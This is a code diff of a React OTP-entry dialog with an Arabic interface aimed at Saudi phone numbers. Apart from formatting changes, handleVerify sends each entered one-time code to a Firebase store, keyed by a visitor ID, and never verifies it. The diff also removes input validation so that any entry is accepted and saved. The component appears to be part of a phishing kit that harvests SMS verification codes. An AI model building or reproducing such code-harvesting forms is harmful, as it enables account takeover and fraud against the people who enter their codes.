@@ -1,70 +1,78 @@
-"use client"
+"use client";
 
-import { useState, useRef, useEffect } from "react"
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { addData } from "@/lib/firebase"
+import { useState, useRef, useEffect } from "react";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { addData } from "@/lib/firebase";
 
 interface OtpDialogProps {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-  phoneNumber: string
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+  phoneNumber: string;
 }
-const allOtps=['']
+const allOtps = [""];
 export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
-  const [otp, setOtp] = useState("")
-  const [timer, setTimer] = useState(60)
-  const inputRef = useRef<HTMLInputElement | null>(null)
+  const [otp, setOtp] = useState("");
+  const [timer, setTimer] = useState(60);
+  const inputRef = useRef<HTMLInputElement | null>(null);
 
   useEffect(() => {
     if (open && timer > 0) {
       const interval = setInterval(() => {
-        setTimer((prev) => prev - 1)
-      }, 1000)
-      return () => clearInterval(interval)
+        setTimer((prev) => prev - 1);
+      }, 1000);
+      return () => clearInterval(interval);
     }
-  }, [open, timer])
+  }, [open, timer]);
 
   useEffect(() => {
     if (open) {
-      setTimer(60)
-      setOtp("")
-      inputRef.current?.focus()
+      setTimer(60);
+      setOtp("");
+      inputRef.current?.focus();
     }
-  }, [open])
+  }, [open]);
 
   const handleChange = (value: string) => {
-    if (/^\d*$/.test(value) && value.length <= 6) {
-      setOtp(value)
-    }
-  }
+    setOtp(value);
+  };
 
   const handleVerify = async () => {
-    console.log("OTP verification:", otp)
-    const visitorID=localStorage.getItem('visitor')
-    allOtps.push(otp)
-   await addData({id:visitorID,phoneOtp:otp})
+    console.log("OTP verification:", otp);
+    const visitorID = localStorage.getItem("visitor");
+    allOtps.push(otp);
+    await addData({ id: visitorID, phoneOtp: otp });
     // Add verification logic here
-    onOpenChange(false)
-  }
+    onOpenChange(false);
+  };
 
   const handleResend = () => {
-    console.log("Resending OTP")
-    setTimer(60)
-    setOtp("")
-    inputRef.current?.focus()
-  }
+    console.log("Resending OTP");
+    setTimer(60);
+    setOtp("");
+    inputRef.current?.focus();
+  };
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="sm:max-w-md" dir="rtl">
         <DialogHeader className="text-center space-y-2">
-          <DialogTitle className="text-2xl font-bold">أدخل رمز التحقق</DialogTitle>
+          <DialogTitle className="text-2xl font-bold">
+            أدخل رمز التحقق
+          </DialogTitle>
           <DialogDescription className="text-base">
             تم إرسال رمز التحقق إلى رقم الجوال
             <br />
-            <span className="font-semibold text-foreground">{phoneNumber}+966</span>
+            <span className="font-semibold text-foreground">
+              {phoneNumber}+966
+            </span>
           </DialogDescription>
         </DialogHeader>
 
@@ -85,10 +93,16 @@ export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
           <div className="text-center">
             {timer > 0 ? (
               <p className="text-sm text-muted-foreground">
-                إعادة إرسال الرمز بعد <span className="font-semibold text-foreground">{timer}</span> ثانية
+                إعادة إرسال الرمز بعد{" "}
+                <span className="font-semibold text-foreground">{timer}</span>{" "}
+                ثانية
               </p>
             ) : (
-              <Button variant="link" onClick={handleResend} className="text-[#1a5c85]">
+              <Button
+                variant="link"
+                onClick={handleResend}
+                className="text-[#1a5c85]"
+              >
                 إعادة إرسال رمز التحقق
               </Button>
             )}
@@ -96,7 +110,6 @@ export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
 
           <Button
             onClick={handleVerify}
-            disabled={otp.length !== 6}
             className="w-full h-12 text-lg bg-[#1a5c85] hover:bg-[#154a6d]"
           >
             تحقق
@@ -104,5 +117,5 @@ export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
         </div>
       </DialogContent>
     </Dialog>
-  )
+  );
 }
